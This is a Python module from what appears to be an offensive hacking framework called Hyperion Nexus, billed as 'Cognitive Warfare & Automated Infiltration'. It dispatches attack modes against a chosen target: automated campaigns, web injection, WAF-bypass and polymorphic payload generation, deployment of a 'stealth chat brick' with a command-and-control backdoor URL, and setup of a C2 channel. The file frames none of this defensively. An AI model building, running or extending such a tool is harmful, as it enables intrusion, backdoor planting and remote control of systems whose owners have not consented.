from core.base_module import BaseModule
from utils.polymorphic_wrapper import PolymorphicWrapper
from utils.polymorphic_wrapper import generate_dynamic_domain
import asyncio
import json
import os
import sys

# Add project root to sys.path for hyperion imports
project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if project_root not in sys.path:
    sys.path.append(project_root)

@PolymorphicWrapper.wrap_module
@PolymorphicWrapper.wrap_module
class HyperionNexus(BaseModule):
    def __init__(self, framework):
        super().__init__(framework)
        self.name = "hyperion_nexus"
        self.description = "Advanced Cognitive Warfare & Automated Infiltration (Hyperion v10.0)"
        self.options = {
            "target": "",
            "mode": "full_pentest", # full_pentest, web_injection, infra_analysis, waf_bypass, chat_brick, polymorphic, c2
            "payload": "calc.exe",
            "platform": "php",
            "channel": "http",
            "framework": "vue"
        }

    def run(self, args):
        target = self.options.get("target")
        mode = self.options.get("mode")
        
        if not target and mode not in ['polymorphic', 'waf_bypass']:
            print("[-] Error: target is required for this mode.")
            return

        print(f"[*] Initializing Hyperion Nexus Core...")
        
        try:
            from hyperion import NexusOrchestrator, NightfuryHyperion
            hyperion = NightfuryHyperion()
            nexus = hyperion.nexus
            
            if mode == "full_pentest":
                print(f"[*] Launching Full Campaign on {target}...")
                results = nexus.start_campaign(f"Campaign_{target}", [target])
                print(f"\n[+] Campaign Results:\n{json.dumps(results, indent=2)}")
                
            elif mode == "web_injection":
                fw = self.options.get("framework", "vue")
                print(f"[*] Testing Web Injection ({fw}) on {target}...")
                results = nexus.modules['web'].inject_chat_brick(target, fw)
                print(f"\n[+] Injection Results:\n{json.dumps(results, indent=2)}")
                
            elif mode == "infra_analysis":
                print(f"[*] Analyzing Infrastructure: {target}...")
                async def run_analysis():
                    recon = await nexus.modules['recon'].comprehensive_scan([target])
                    return nexus.modules['infra'].analyze_infrastructure(recon)
                results = asyncio.run(run_analysis())
                print(f"\n[+] Infrastructure Analysis:\n{json.dumps(results, indent=2)}")
                
            elif mode == "waf_bypass":
                payload = self.options.get("payload")
                print(f"[*] Generating WAF Bypasses for: {payload}")
                results = nexus.modules['waf'].bypass_waf(payload)
                print(f"\n[+] Bypass Results:\n{json.dumps(results, indent=2)}")
                
            elif mode == "chat_brick":
                backdoor = self.framework.config.get('c2_url', 'http://c2.internal-nexus.net')
                print(f"[*] Deploying Stealth Chat Brick to {target} (C2: {backdoor})...")
                results = nexus.modules['chat'].inject_stealth_chat(target, backdoor)
                print(f"\n[+] Chat Injection Results:\n{json.dumps(results, indent=2)}")
                
            elif mode == "polymorphic":
                payload = self.options.get("payload")
                plat = self.options.get("platform", "php")
                print(f"[*] Generating Polymorphic {plat} Payload...")
                poly = nexus.modules['polymorphic'].generate_polymorphic_payload(payload, plat)
                print(f"\n[+] Polymorphic Payload:\n{poly}")
                
            elif mode == "c2":
                chan = self.options.get("channel", "http")
                print(f"[*] Establishing {chan} C2 Channel to {target}...")
                async def start_c2():
                    return await nexus.modules['c2'].establish_c2(target, chan)
                c2 = asyncio.run(start_c2())
                print(f"\n[+] C2 Established. Agent ID: {c2['agent_id']}")
                
        except ImportError as e:
            print(f"[-] Failed to load Hyperion core: {e}")
            print("[!] Ensure hyperion.py is in the project root and dependencies are installed.")
        except Exception as e:
            print(f"[-] Hyperion Error: {e}")
